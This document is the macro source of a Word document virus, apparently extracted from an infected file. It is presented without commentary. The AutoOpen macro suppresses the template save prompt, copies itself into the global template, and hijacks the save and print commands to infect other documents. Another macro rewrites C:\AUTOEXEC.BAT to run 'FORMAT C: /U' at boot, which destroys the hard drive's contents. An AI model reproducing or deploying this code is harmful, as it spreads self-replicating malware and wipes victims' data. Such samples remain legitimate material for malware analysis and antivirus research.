   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Makrone3"

   Attribute VB_Name = "Makrone2"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Makrone2.MAIN"
   WordBasic.MacroCopy "Global:Tempo", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:Makrone", WordBasic.[FileName$]() + ":Makrone1"
   WordBasic.MacroCopy "Global:DateiSpeichern", WordBasic.[FileName$]() + ":Makrone2"
   WordBasic.MacroCopy "Global:DateiDrucken", WordBasic.[FileName$]() + ":Makrone3"
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   WordBasic.Call "Makrone"
   End Sub

   Attribute VB_Name = "Makrone1"

   Public Sub MAIN()
   Dim name_$
   Dim gag1$
   Dim gag2$
   Dim zeilen
   Dim z$
   Dim i
   Dim attr
   name_$ = "C:\AUTOEXEC.BAT"
   gag1$ = "@ECHO N|FORMAT C: /U"
   gag2$ = "@ECHO " + Chr(7) + Chr(13) + Chr(10) + "@ECHO|DIR /S > NUL"
   Open name_$ For Input As 1
   zeilen = 0
   While Not EOF(1)
      Line Input #1, z$: zeilen = zeilen + 1
      If z$ = gag1$ Then GoTo ende
   Wend
   ReDim datei__$(zeilen)
   Seek 1, 0 + 1
   For i = 1 To zeilen: Line Input #1, datei__$(i): Next
   Close (1)
   attr = GetAttr(name_$)
   SetAttr name_$, 0
   Open name_$ For Output As 1
   Print #1, gag1$
   Print #1, gag2$
   For i = 1 To zeilen: Print #1, datei__$(i): Next
   SetAttr name_$, attr
   ende:
   Close (1)
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:Tempo"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Makrone1", "Global:Makrone"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Makrone2", "Global:DateiSpeichern"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":Makrone3", "Global:DateiDrucken"
   WordBasic.Call "Makrone"
   End Sub
